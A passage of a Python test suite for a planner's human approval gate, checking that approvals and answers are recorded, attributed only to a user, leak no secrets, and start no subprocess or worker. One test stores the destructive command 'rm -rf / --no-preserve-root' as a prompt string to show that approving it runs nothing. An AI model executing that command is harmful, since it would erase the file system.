        from cofferdam.workstation.planner.store import PlannerStoreUnavailable

        request_id = self.prompt_request()
        with self.assertRaises(PlannerStoreUnavailable):
            self.store.record_authority_event(
                authority_event_id=new_authority_event_id(),
                planner_request_id=request_id,
                gate_kind=GATE_CONFIRMATION, authority_action="approve",
                subject_fingerprint="0" * 64, result_schema_version=1,
                actor="user", source="internal_test",
                recorded_at="2026-08-20T00:00:03Z",
                expected_action=ACTION_ASK_USER,
            )
        self.assertEqual(self.rows("planner_authority_events"), 0)

    def test_the_authority_table_is_never_updated_or_deleted_from(self):
        import cofferdam.workstation.planner.store as store_module

        source = Path(store_module.__file__).read_text(encoding="utf-8")
        for statement in ("UPDATE planner_authority_events",
                          "DELETE FROM planner_authority_events"):
            self.assertNotIn(statement, source, f"the store issues {statement}")


# -- 12, 15, 25. provenance ---------------------------------------------------


class Provenance(AuthorityHarness):
    def test_a_decision_cannot_be_attributed_to_a_machine(self):
        for actor in ("system", "planner", "adapter", "cofferdam"):
            with self.assertRaises(PlannerAuthorityInvalid):
                AuthorityProvenance(actor=actor, source="internal_test")

    def test_an_unknown_source_is_refused(self):
        with self.assertRaises(PlannerAuthorityInvalid):
            AuthorityProvenance(actor="user", source="chatgpt")

    def test_a_reserved_source_no_surface_produces_is_refused(self):
        """In the vocabulary, not enabled — the day a route arrives is a change."""
        self.assertNotIn(SOURCE_WORKSTATION_PWA, ACCEPTED_AUTHORITY_SOURCES)
        with self.assertRaises(PlannerAuthorityInvalid):
            AuthorityProvenance(actor="user", source=SOURCE_WORKSTATION_PWA)

    def test_provenance_is_not_built_from_a_mapping(self):
        """A caller-supplied dict is how a caller-chosen source arrives."""
        request_id = self.prompt_request()
        with self.assertRaises(PlannerAuthorityInvalid):
            self.authority.approve_prepared_worker_prompt(
                request_id, provenance={"actor": "user", "source": "internal_test"})
        self.assertIsNone(self.store.authority_event(request_id))

    def test_provenance_carries_no_identity_field(self):
        fields = set(AuthorityProvenance.__dataclass_fields__)
        self.assertEqual(fields, {"actor", "source"})
        for forbidden in ("name", "email", "user_id", "token", "ip", "user_agent",
                          "device_id", "header"):
            self.assertNotIn(forbidden, fields)

    def test_the_recorded_decision_answers_the_provenance_questions(self):
        request_id = self.prompt_request()
        gate = self.authority.approve_prepared_worker_prompt(
            request_id, provenance=AuthorityProvenance.local_call())
        decision = gate.to_dict()["decision"]
        self.assertEqual(decision["provenance"], {"actor": "user",
                                                  "source": "local_call"})
        self.assertEqual(decision["planner_request_id"], request_id)
        self.assertEqual(decision["authority_action"], "approve")
        self.assertTrue(decision["decided_at"])
        self.assertTrue(decision["authorized_subject_fingerprint"])


# -- 15, 26-29. the read model ------------------------------------------------


class ReadModel(AuthorityHarness):
    def test_a_waiting_confirmation_reads_as_waiting(self):
        payload = self.authority.view(self.prompt_request()).to_dict()["human_gate"]
        self.assertEqual(payload["gate_kind"], GATE_CONFIRMATION)
        self.assertEqual(payload["gate_state"], GATE_STATE_AWAITING_CONFIRMATION)
        self.assertTrue(payload["awaiting_human"])
        self.assertIsNone(payload["decision"])
        self.assertEqual(payload["permitted_actions"], ["approve", "reject"])

    def test_an_approval_is_visible(self):
        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        payload = self.authority.view(request_id).to_dict()["human_gate"]
        self.assertEqual(payload["gate_state"], GATE_STATE_APPROVED)
        self.assertTrue(payload["decision"]["binds_current_subject"])

    def test_a_rejection_and_its_reason_are_visible(self):
        request_id = self.prompt_request()
        self.authority.reject_prepared_worker_prompt(
            request_id, reason="wrong scope", provenance=self.who)
        payload = self.authority.view(request_id).to_dict()["human_gate"]
        self.assertEqual(payload["gate_state"], GATE_STATE_REJECTED)
        self.assertEqual(payload["decision"]["rejection_reason"], "wrong scope")

    def test_an_answer_is_exposed_on_an_answer_gate(self):
        request_id = self.question_request()
        self.authority.answer_planner_question(
            request_id, answer="postgres", provenance=self.who)
        decision = self.authority.view(request_id).to_dict()["human_gate"]["decision"]
        self.assertEqual(decision["answer"], "postgres")

    def test_a_confirmation_decision_carries_no_answer_field(self):
        """There is no answer on a confirmation gate, so none is reported."""
        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        decision = self.authority.view(request_id).to_dict()["human_gate"]["decision"]
        self.assertNotIn("answer", decision)

    def test_the_gate_read_model_leaks_nothing(self):
        request_id = self.question_request()
        self.authority.answer_planner_question(
            request_id, answer="postgres", provenance=self.who)
        payload = self.authority.view(request_id).to_dict()

        def keys(node):
            if isinstance(node, dict):
                for key, value in node.items():
                    yield key
                    yield from keys(value)
            elif isinstance(node, list):
                for item in node:
                    yield from keys(item)

        present = set(keys(payload))
        for leaked in ("request_payload", "request_payload_json", "project_context",
                       "models_used_json", "session_id", "env", "environment",
                       "token", "auth_token", "api_key", "password", "cookie",
                       "chain_of_thought", "reasoning"):
            self.assertNotIn(leaked, present, f"read model leaks {leaked}")

    def test_reads_are_idempotent(self):
        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        self.assertEqual(self.authority.view(request_id).to_dict(),
                         self.authority.view(request_id).to_dict())

    def test_the_planner_lifecycle_is_still_its_own_field(self):
        """Invocation lifecycle, planner action and gate state are three things."""
        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        payload = self.authority.view(request_id).to_dict()
        self.assertEqual(payload["planner_request"]["status"], STATUS_SUCCEEDED)
        self.assertEqual(payload["planner_request"]["action"],
                         ACTION_PREPARE_WORKER_PROMPT)
        self.assertEqual(payload["human_gate"]["gate_state"], GATE_STATE_APPROVED)
        self.assertEqual(len({STATUS_SUCCEEDED, ACTION_PREPARE_WORKER_PROMPT,
                              GATE_STATE_APPROVED}), 3)


# -- 33-36, 45. the vocabulary is the assertion -------------------------------


class NoExecutionPrimitive(AuthorityHarness):
    def test_the_authority_vocabulary_is_exactly_three_words(self):
        self.assertEqual(AUTHORITY_ACTIONS, ("answer", "approve", "reject"))
        for absent in ("edit_and_approve", "approve_and_dispatch", "run", "execute",
                       "replan", "delegate", "override", "dispatch"):
            self.assertNotIn(absent, AUTHORITY_ACTIONS)

    def test_the_service_exposes_no_dispatch_operation(self):
        for forbidden in ("dispatch", "run_worker", "execute", "send_to_worker",
                          "create_task", "submit", "replan", "plan_again",
                          "edit_and_approve", "approve_and_dispatch"):
            self.assertFalse(hasattr(PlannerAuthorityService, forbidden),
                             f"service exposes {forbidden}")

    def test_the_service_takes_no_execution_argument(self):
        for method in (
            PlannerAuthorityService.answer_planner_question,
            PlannerAuthorityService.approve_prepared_worker_prompt,
            PlannerAuthorityService.reject_prepared_worker_prompt,
        ):
            params = set(inspect.signature(method).parameters)
            for forbidden in ("model", "executable", "cwd", "command", "argv", "env",
                              "provider", "tools", "mcp_config", "path", "adapter",
                              "task_id", "dispatch", "worker"):
                self.assertNotIn(forbidden, params,
                                 f"{method.__name__} accepts {forbidden}")

    def test_the_authority_service_has_no_planner_to_call(self):
        """The strongest form of 'an answer does not replan': there is nothing here.

        Constructed with the store and a clock. No provider, no context builder,
        no projector — so recording a decision cannot start a planning turn, not
        because it declines to but because it has nothing to decline.
        """
        params = set(inspect.signature(PlannerAuthorityService.__init__).parameters)
        self.assertEqual(params, {"self", "store", "clock"})
        for forbidden in ("planner", "context", "projector", "provider", "tasks",
                          "adapter", "registry"):
            self.assertNotIn(forbidden, params)
        self.assertEqual(
            [name for name in vars(self.authority) if "planner" in name
             and name != "_store"],
            [],
        )


# -- 17, 32-35. approval dispatches nothing; answer replans nothing -----------


class ApprovalDispatchesNothing(AuthorityHarness):
    """The regression this whole PR exists to make impossible."""

    def forbid_subprocesses(self):
        import subprocess

        def refuse(*args, **kwargs):
            raise AssertionError("the authority path started a subprocess")

        for name in ("Popen", "run", "call", "check_call", "check_output"):
            original = getattr(subprocess, name)
            setattr(subprocess, name, refuse)
            self.addCleanup(setattr, subprocess, name, original)

    def test_approval_starts_nothing(self):
        from cofferdam.workstation.tasks.adapters import build_registry

        self.forbid_subprocesses()
        request_id = self.prompt_request("go and do it")
        before = sorted(path.name for path in self.dir.iterdir())

        gate = self.authority.approve_prepared_worker_prompt(
            request_id, provenance=self.who)

        self.assertEqual(gate.state, GATE_STATE_APPROVED)
        self.assertEqual(self.authority.gate(request_id).state, GATE_STATE_APPROVED)
        # No task, no adapter, no task database, no new file on disk.
        self.assertEqual(build_registry().ids(), ())
        self.assertFalse((self.dir / "tasks.sqlite3").exists())
        after = sorted(path.name for path in self.dir.iterdir())
        self.assertEqual(
            [name for name in after if not name.startswith("planner.sqlite3")],
            [name for name in before if not name.startswith("planner.sqlite3")],
        )

    def test_approval_creates_no_task_core_task(self):
        """A real Task Core database, opened alongside, gains nothing."""
        from cofferdam.workstation.tasks.store import TaskStore

        tasks = TaskStore(None, path=self.dir / "tasks.sqlite3")
        before = dict(tasks.counts_by_state())

        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)

        self.assertEqual(dict(tasks.counts_by_state()), before)
        self.assertEqual(sum(tasks.counts_by_state().values()), 0)
        self.assertEqual(len(tasks.list_tasks()), 0)

    def test_approval_touches_only_the_authority_table(self):
        request_id = self.prompt_request()
        before = self.store.get(request_id).to_dict()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        self.assertEqual(self.store.get(request_id).to_dict(), before)
        self.assertEqual(self.rows("planner_requests"), 1)

    def test_the_approved_prompt_is_still_only_a_string(self):
        request_id = self.prompt_request("rm -rf / --no-preserve-root")
        gate = self.authority.approve_prepared_worker_prompt(
            request_id, provenance=self.who)
        self.assertEqual(gate.state, GATE_STATE_APPROVED)
        self.assertEqual(self.store.get(request_id).worker_prompt,
                         "rm -rf / --no-preserve-root")


class AnswerDoesNotReplan(AuthorityHarness):
    def test_answering_does_not_invoke_the_planner_again(self):
        from cofferdam.workstation.planner import PlannerService

        from .test_planner_durability import FakeContext, FakePlanner, FakeProjector

        planner = FakePlanner(result=a_result(ACTION_ASK_USER,
                                              user_question="which database?"))
        outcome = PlannerService(
            store=self.store, planner=planner, context=FakeContext(),
            projector=FakeProjector(),
        ).prepare_development_step(user_intent="bir seyler yapalim")
        self.assertEqual(len(planner.calls), 1)
        requests_before = self.rows("planner_requests")

        gate = self.authority.answer_planner_question(
            outcome.planner_request_id, answer="postgres", provenance=self.who)

        self.assertEqual(gate.state, GATE_STATE_ANSWERED)
        self.assertEqual(len(planner.calls), 1, "the planner was invoked again")
        self.assertEqual(self.rows("planner_requests"), requests_before,
                         "a new planner request appeared")

    def test_the_answer_is_bound_to_the_question_it_answered(self):
        request_id = self.question_request("hangi veritabanı?")
        gate = self.authority.answer_planner_question(
            request_id, answer="postgres", provenance=self.who)
        self.assertEqual(
            gate.event.subject_fingerprint,
            authority_subject_fingerprint(
                planner_request_id=request_id,
                result_schema_version=PLANNER_RESULT_SCHEMA_VERSION,
                action=ACTION_ASK_USER, subject="hangi veritabanı?",
            ),
        )
        self.assertTrue(gate.binds_current_subject)

    def test_answering_dispatches_no_worker(self):
        from cofferdam.workstation.tasks.adapters import build_registry

        request_id = self.question_request()
        self.authority.answer_planner_question(
            request_id, answer="do the second option", provenance=self.who)
        self.assertEqual(build_registry().ids(), ())
        self.assertFalse((self.dir / "tasks.sqlite3").exists())


# -- 38-40. the neighbours ----------------------------------------------------


class Neighbours(unittest.TestCase):
    def test_task_core_schema_version_is_untouched(self):
        from cofferdam.workstation.tasks.store import SCHEMA_VERSION

        self.assertEqual(SCHEMA_VERSION, 11)

    def test_task_core_registry_is_unchanged(self):
        from cofferdam.workstation.tasks.adapters import build_registry

        self.assertEqual(build_registry().ids(), ())
        self.assertEqual(
            build_registry(enable_validation_adapter=True).ids(), ("validation",)
        )

    def test_the_planner_result_contract_did_not_change(self):
        from cofferdam.workstation.planner.models import result_field_names

        self.assertEqual(PLANNER_RESULT_SCHEMA_VERSION, 1)
        self.assertEqual(
            result_field_names(),
            ("action", "summary", "confidence", "schema_version", "worker_prompt",
             "user_question", "decision_basis"),
        )

    def test_the_planner_action_vocabulary_did_not_grow(self):
        from cofferdam.workstation.planner import PLANNER_ACTIONS

        self.assertEqual(PLANNER_ACTIONS,
                         ("ASK_USER", "PREPARE_WORKER_PROMPT", "STOP"))


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
